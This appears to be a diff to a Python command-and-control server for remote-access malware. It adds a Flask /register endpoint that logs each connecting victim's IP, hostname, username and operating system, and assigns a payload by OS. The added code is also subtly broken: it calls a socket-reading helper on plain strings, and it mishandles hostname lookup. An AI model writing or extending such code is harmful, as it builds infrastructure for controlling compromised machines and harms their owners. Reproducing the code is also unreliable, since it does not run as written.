@@ -15,6 +15,25 @@ listener_counter = 0
 kill_flag = 0
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+@app.route('/register', methods=['POST'])
+def register():
+    try:
+        data = request.json
+        print(f"Received registration data: {data}")
+        remote_ip = request.remote_addr
+        username = comm_in(data['username'])
+        op_sys = comm_in(data['os'])
+        pay_val = 1 if 'Windows' in op_sys else 2
+        cur_time = time.strftime("%H:%M:%S", time.localtime())
+        date = datetime.now()
+        time_record = f"{date.month}/{date.day}/{date.year} {cur_time}"
+        host_name = socket.gethostbyaddr(remote_ip)[0] if socket.gethostbyaddr(remote_ip) else remote_ip
+        targets.append([remote_ip, f"{host_name}@{remote_ip}", time_record, username, op_sys, pay_val, 'Active'])
+        return jsonify({"message": "Registered successfully."})
+    except Exception as e:
+        print(f"Error during registration: {e}")
+        return jsonify({"error": str(e)}), 500
+
 def comm_in(targ_id):
     message_rec = targ_id.recv(1024).decode('utf-8')
     message_rec = base64.b64decode(message_rec).decode('utf-8')
